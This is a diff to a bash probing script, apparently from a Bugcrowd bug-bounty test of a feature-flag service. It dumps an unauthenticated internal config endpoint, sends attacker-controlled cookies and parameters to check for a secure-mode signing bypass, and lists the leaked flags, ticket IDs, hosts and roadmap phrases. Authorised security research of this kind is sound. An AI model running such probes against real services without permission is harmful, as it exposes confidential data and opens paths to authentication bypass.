@@ -170,5 +170,92 @@ else
   echo "  (needs bundle-api-paths.txt + openapi-paths.txt from ci-route-matrix.sh in the same dir)" | tee -a "$RES"
 fi
 
-find "$OUT/raw2" -type f -size +64k -delete 2>/dev/null || true
+echo | tee -a "$RES"
+echo "=== 8. deep dive: /internal/config/anonymous (unauthenticated config dump) ===" | tee -a "$RES"
+# Confirmed live 2026-09-11: this endpoint answers with NO credentials and returns LD's own
+# dogfood config + internal client-side feature flags. Capture it fully and characterise it.
+CFG="$OUT/internal-config-anonymous.json"
+curl -sS --compressed --max-time 30 -A "$UA" -D "$OUT/raw2/cfg_anon.hdr" \
+  "$LD/internal/config/anonymous" -o "$CFG" 2>/dev/null || true
+echo "  size: $(wc -c < "$CFG" 2>/dev/null | tr -d ' ') bytes" | tee -a "$RES"
+echo "  response headers:" | tee -a "$RES"
+sed 's/^/    /' "$OUT/raw2/cfg_anon.hdr" 2>/dev/null | head -20 | tee -a "$RES"
+
+# Second fetch: is the dogfood context / secure-mode hash per-request random or stable?
+CFG2="$OUT/raw2/cfg_anon_2.json"
+sleep 1
+curl -sS --compressed --max-time 30 -A "$UA" "$LD/internal/config/anonymous" -o "$CFG2" 2>/dev/null || true
+# Third fetch: does a client-supplied cookie/param change the signed context? (read-only GETs)
+CFG3="$OUT/raw2/cfg_anon_cookie.json"
+curl -sS --compressed --max-time 30 -A "$UA" \
+  -H 'Cookie: ld_anonymous_id=bugcrowd-test-0001; sandboxVisitorAccountId=bugcrowd-test-0001' \
+  "$LD/internal/config/anonymous?contextKey=bugcrowd-test-0002" -o "$CFG3" 2>/dev/null || true
+
+python3 - "$CFG" "$CFG2" "$CFG3" <<'PY' | tee -a "$RES"
+import json, sys, re
+def load(p):
+    try:
+        return json.load(open(p, errors='ignore'))
+    except Exception:
+        return None
+a, b, c = (load(p) for p in sys.argv[1:4])
+def summary(d, label):
+    if not isinstance(d, dict):
+        print(f"  {label}: <not JSON / unavailable>")
+        return
+    ctx = d.get('dogfoodContext') or {}
+    sess = (ctx.get('session') or {}).get('key')
+    user = (ctx.get('user') or {}).get('key')
+    flags = d.get('allClientSideFlags') or {}
+    print(f"  {label}: clientSideId={d.get('clientSideId')}")
+    print(f"        dogfoodBaseUri={d.get('dogfoodBaseUri')}")
+    print(f"        dogfoodStreamUri={d.get('dogfoodStreamUri')}")
+    print(f"        dogfoodEventsUri={d.get('dogfoodClientSideEventsUri')}  sendEvents={d.get('dogfoodSendEvents')}")
+    print(f"        dogfoodContext.session.key={sess}")
+    print(f"        dogfoodContext.user.key={user}  user.attrs={ {k:v for k,v in (ctx.get('user') or {}).items() if k not in ('key',)} }")
+    print(f"        secureModeContextHash={d.get('secureModeContextHash')}")
+    print(f"        top-level keys={sorted(d.keys())}")
+    print(f"        allClientSideFlags: {len(flags)} entries; $valid={flags.get('$valid')}")
+summary(a, 'fetch#1')
+summary(b, 'fetch#2')
+summary(c, 'fetch#3 (cookie+param supplied)')
+
+if isinstance(a, dict) and isinstance(b, dict):
+    ha, hb = a.get('secureModeContextHash'), b.get('secureModeContextHash')
+    ka = ((a.get('dogfoodContext') or {}).get('session') or {}).get('key')
+    kb = ((b.get('dogfoodContext') or {}).get('session') or {}).get('key')
+    print(f"  --> secureModeContextHash stable across requests? {ha == hb}")
+    print(f"  --> dogfood session key stable across requests?   {ka == kb}")
+    if ha == hb and ka == kb:
+        print("      STABLE: the signed context is not per-visitor -> check what it is derived from")
+    else:
+        print("      PER-REQUEST: server signs a fresh anonymous context each call")
+if isinstance(a, dict) and isinstance(c, dict):
+    kc = ((c.get('dogfoodContext') or {}).get('session') or {}).get('key')
+    ka = ((a.get('dogfoodContext') or {}).get('session') or {}).get('key')
+    print(f"  --> attacker-supplied cookie/param changed the signed context key? {kc != ka} (fetch#3 key={kc})")
+    if kc and 'bugcrowd-test' in str(kc):
+        print("      *** CONTEXT IS ATTACKER-CONTROLLED -> the server will sign an arbitrary context")
+        print("          key with a valid secure-mode hash => secure-mode bypass primitive (H5). ***")
+
+# inventory the disclosed flags + confidential-looking strings
+if isinstance(a, dict):
+    flags = a.get('allClientSideFlags') or {}
+    open(sys.argv[1] + '.flagnames.txt', 'w').write('\n'.join(sorted(flags)) + '\n')
+    print(f"  --> flag names written to internal-config-anonymous.json.flagnames.txt ({len(flags)})")
+    blob = json.dumps(a)
+    jira = sorted(set(re.findall(r'\b[A-Z]{3,8}-\d{2,6}\b', blob)))
+    print(f"  --> internal ticket refs disclosed: {len(jira)} -> {jira[:25]}")
+    hosts = sorted(set(re.findall(r'https?://[a-zA-Z0-9._-]+', blob)))
+    print(f"  --> hosts referenced: {hosts[:25]}")
+    for needle in ('not yet built', 'not planned', 'Q3 2026', 'legacy Airflow', 'junk-country',
+                   'federal', 'commit '):
+        n = blob.lower().count(needle.lower())
+        if n:
+            print(f"  --> confidential-roadmap phrase {needle!r}: {n} occurrence(s)")
+PY
+
+# keep the full config (public data, no customer secrets) but bound everything else
+cp "$CFG" "$OUT/internal-config-anonymous-fetch1.json" 2>/dev/null || true
+find "$OUT/raw2" -type f -size +256k -delete 2>/dev/null || true
 echo "internal-probe done -> $OUT (hits: $(grep -c '^\*\*\*' "$HITS" 2>/dev/null || echo 0))" | tee -a "$RES"
